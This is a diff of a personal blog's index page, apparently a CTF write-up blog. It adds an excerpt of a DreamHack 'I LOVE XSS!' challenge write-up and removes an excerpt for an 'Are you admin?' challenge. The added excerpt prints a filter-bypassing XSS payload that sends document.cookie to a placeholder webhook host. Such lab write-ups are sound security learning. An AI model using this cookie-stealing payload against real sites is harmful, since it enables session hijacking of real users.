@@ -159,6 +159,26 @@
 
 <article class="post-entry"> 
 <figure class="entry-cover">
+        <img loading="lazy" src="http://localhost:1313/images/posts/dreamhack-writeup.jpg" alt="DreamHack - I LOVE XSS!">
+</figure>
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">DreamHack - I LOVE XSS! Web Challenge Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Goal Leveraging XSS Scriptin to get the flag.
+My Solution The app has a banned list for XSS Scripting:
+banlist = [&#34;`&#34;,&#34;&#39;&#34;,&#34;alert(&#34;,&#34;fetch(&#34;,&#34;replace(&#34;,&#34;[&#34;,&#34;]&#34;,&#34;javascript&#34;,&#34;@&#34;,&#34;!&#34;,&#34;%&#34;,&#34;location&#34;,&#34;href&#34;,&#34;window&#34;,&#34;eval&#34;] Also in sanitizer.py it do allow &lt;script&gt; tag however no any attributes is allowed:
+import bleach ALLOWED_TAGS = [&#39;script&#39;] #I only love script tags! ALLOWED_ATTRIBUTES = {} ALLOWED_PROTOCOLS = [&#39;http&#39;, &#39;https&#39;] def sanitize_input(user_input: str) -&gt; str: return bleach.clean( user_input, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRIBUTES, protocols=ALLOWED_PROTOCOLS, strip=True, strip_comments=True ) Initially, I create a payload:
+&lt;script&gt;document.write(&#34;\x3cimg src=\&#34;https://YOUR_WEBHOOK/webhook?c=&#34;&#43;document.cookie&#43;&#34;\&#34;\x3e&#34;)&lt;/script&gt; \x3c and \x3e is HEX code of &lt; and &gt; and used \&#34; because &#39; single quote is banned. However &#43; is treated as space in URL Encoded so I use concat instead:
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2025-11-25 15:15:11 +0700 +07'>November 25, 2025</span>&nbsp;·&nbsp;<span>1 min</span></footer>
+  <a class="entry-link" aria-label="post link to DreamHack - I LOVE XSS! Web Challenge Writeup" href="http://localhost:1313/posts/dreamhack-i-love-xss-web-challenge-writeup/"></a>
+</article>
+
+<article class="post-entry"> 
+<figure class="entry-cover">
         <img loading="lazy" src="http://localhost:1313/images/posts/dreamhack-writeup.jpg" alt="DreamHack - Test site">
 </figure>
   <header class="entry-header">
@@ -326,25 +346,6 @@ app.get(&#39;/&#39;, async (req, res) =&gt; { try { let token = req.cookies.auth
   <footer class="entry-footer"><span title='2025-11-20 09:59:14 +0700 +07'>November 20, 2025</span>&nbsp;·&nbsp;<span>3 min</span></footer>
   <a class="entry-link" aria-label="post link to DreamHack - development-env Web Challenge Write-up" href="http://localhost:1313/posts/dreamhack-development-env-web-challenge-writeup/"></a>
 </article>
-
-<article class="post-entry"> 
-<figure class="entry-cover">
-        <img loading="lazy" src="http://localhost:1313/images/posts/dreamhack-are-you-admin.jpg" alt="DreamHack - Are you admin?">
-</figure>
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">DreamHack - Are you admin? Web Challenge Write-up
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p> Room / Challenge: are you admin? (Web)
-Metadata Author: jameskaois CTF: DreamHack Challenge: are you admin? (web) Link: https://dreamhack.io/wargame/challenges/1922 Level: 2 Date: 19-11-2025 Goal XSS Scripting takes in place to get the flag.
-My Solution The app is vulnerable to XSS Scripting:
-@app.route(&#34;/intro&#34;, methods=[&#34;GET&#34;]) def intro(): name = request.args.get(&#34;name&#34;) detail = request.args.get(&#34;detail&#34;) return render_template(&#34;intro.html&#34;, name=name, detail=detail) @app.route(&#34;/report&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;]) def report(): if request.method == &#34;POST&#34;: path = request.form.get(&#34;path&#34;) if not path: return render_template(&#34;report.html&#34;, msg=&#34;fail&#34;) else: parsed_path = urlparse(path) params = parse_qs(parsed_path.query) name = params.get(&#34;name&#34;, [None])[0] detail = params.get(&#34;detail&#34;, [None])[0] if access_page(name, detail): return render_template(&#34;report.html&#34;, message=&#34;Success&#34;) else: return render_template(&#34;report.html&#34;, message=&#34;fail&#34;) else: return render_template(&#34;report.html&#34;) @app.route(&#34;/whoami&#34;, methods=[&#34;GET&#34;]) def whoami(): user_info = &#34;&#34; authorization = request.headers.get(&#39;Authorization&#39;) if authorization: user_info = b64decode(authorization.split(&#39;Basic &#39;)[1].encode()).decode() else: user_info = &#34;guest:guest&#34; id = user_info.split(&#34;:&#34;)[0] password = user_info.split(&#34;:&#34;)[1] if ((id == &#39;admin&#39;) and (password == &#39;[**REDACTED**]&#39;)): message = FLAG return render_template(&#39;whoami.html&#39;,id=id, message=message) else: message = &#34;You are guest&#34; return render_template(&#39;whoami.html&#39;,id=id, message=message) There are 3 routes in the app, /intro is where we use to inject Javascript, /report is to report the URL to the bot, /whoami is where we can use to make the bot to get the flag for us.
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-11-19 10:21:25 +0700 +07'>November 19, 2025</span>&nbsp;·&nbsp;<span>2 min</span></footer>
-  <a class="entry-link" aria-label="post link to DreamHack - Are you admin? Web Challenge Write-up" href="http://localhost:1313/posts/dreamhack-are-you-admin-web-challenge-writeup/"></a>
-</article>
 <footer class="page-footer">
   <nav class="pagination">
     <a class="next" href="http://localhost:1313/posts/page/2/">Next&nbsp;&nbsp;»
@@ -362,6 +363,8 @@ My Solution The app is vulnerable to XSS Scripting:
         <h2>Recently Added</h2>
 
         
+        <div><a href="http://localhost:1313/posts/dreamhack-i-love-xss-web-challenge-writeup/">DreamHack - I LOVE XSS! Web Challenge Writeup</a></div>
+        
         <div><a href="http://localhost:1313/posts/dreamhack-test-site-web-challenge-writeup/">DreamHack - Test site Web Challenge Writeup</a></div>
         
         <div><a href="http://localhost:1313/posts/dreamhack-special-letter-translator-web-challenge-writeup/">DreamHack - Special Letter Translator Web Challenge Writeup</a></div>
@@ -369,8 +372,6 @@ My Solution The app is vulnerable to XSS Scripting:
         <div><a href="http://localhost:1313/posts/patriot-ctf-2025-web-challenges-writeups/">Patriot CTF 2025 - Web Challenges Writeups</a></div>
         
         <div><a href="http://localhost:1313/posts/dreamhack-black-hacker-company-web-challenge-writeup/">DreamHack - Black-Hacker-Company Web Challenge Write-up</a></div>
-        
-        <div><a href="http://localhost:1313/posts/dreamhack-not-only-web-challenge-writeup/">DreamHack - Not-only Web Challenge Write-up</a></div>
         
     </section>
 
